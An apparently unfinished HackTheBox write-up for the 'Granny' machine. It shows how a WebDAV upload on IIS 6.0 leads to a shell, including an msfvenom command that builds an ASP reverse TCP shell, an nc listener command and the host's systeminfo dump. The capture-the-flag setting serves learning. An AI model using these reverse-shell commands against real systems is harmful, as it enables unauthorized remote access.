# * Granny
`* Still in progress`

## Recon

The tags on [this box](https://app.hackthebox.com/machines/14)  
> - Windows
> - Patch Management  
> - Web

Difficulty:
> Easy

The only open port is 80. There is an IIS 6.0 webserver running. The homepage appears to be broken:

![[Pasted image 20220115184455.png]]

IIS 6.0 is way old. There's gotta be exploits for it out there. I reviewed EDB exploits using searchsploit, but none of them seem exciting. I decided to check with [Hacktricks's WebDav page](https://book.hacktricks.xyz/pentesting/pentesting-web/put-method-webdav) and was happy to find the following method to gain code execution.

For the shell, I'll be using msfvenom to create a reverse tcp shell for windows.
```bash
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.16.2 LPORT=4444 -f asp -o reverse.asp
```

![[Pasted image 20220115185937.png]]

Now start a listener to catch the reverse shell.

```bash
nc -nvlp 4444
```

Then trigger the exploit by visiting the malicious page we just uploaded.

![[Pasted image 20220115190110.png]]

Look, a shell!

![[Pasted image 20220115190203.png]]

System Info

```
> Host Name:                 GRANNY  
> OS Name:                   Microsoft(R) Windows(R) Server 2003, Standard Edition  
> OS Version:                5.2.3790 Service Pack 2 Build 3790  
> OS Manufacturer:           Microsoft Corporation  
> OS Configuration:          Standalone Server  
> OS Build Type:             Uniprocessor Free  
> Registered Owner:          HTB  
> Registered Organization:   HTB  
> Product ID:                69712-296-0024942-44782  
> Original Install Date:     4/12/2017, 5:07:40 PM  
> System Up Time:            0 Days, 0 Hours, 53 Minutes, 6 Seconds  
> System Manufacturer:       VMware, Inc.  
> System Model:              VMware Virtual Platform  
> System Type:               X86-based PC  
> Processor(s):              1 Processor(s) Installed.  
>   [01]: x86 Family 23 Model 1 Stepping 2 AuthenticAMD ~2000 Mhz  
> BIOS Version:              INTEL  - 6040000  
>  Windows Directory:         C:\WINDOWS  
> System Directory:          C:\WINDOWS\system32  
> Boot Device:               \Device\HarddiskVolume1  
> System Locale:             en-us;English (United States)  
> Input Locale:              en-us;English (United States)  
> Time Zone:                 (GMT+02:00) Athens, Beirut, Istanbul, Minsk  
> Total Physical Memory:     1,023 MB  
> Available Physical Memory: 709 MB  
> Page File: Max Size:       2,470 MB  
> Page File: Available:      2,255 MB  
> Page File: In Use:         215 MB  
> Page File Location(s):     C:\pagefile.sys  
> Domain:                    HTB  
> Logon Server:              N/A  
> Hotfix(s):                 1 Hotfix(s) Installed.  
> [01]: Q147222  
> Network Card(s):           N/A 
```


## Privesc

I used the same technique to upload winpeas.bat to do some more enumeration.
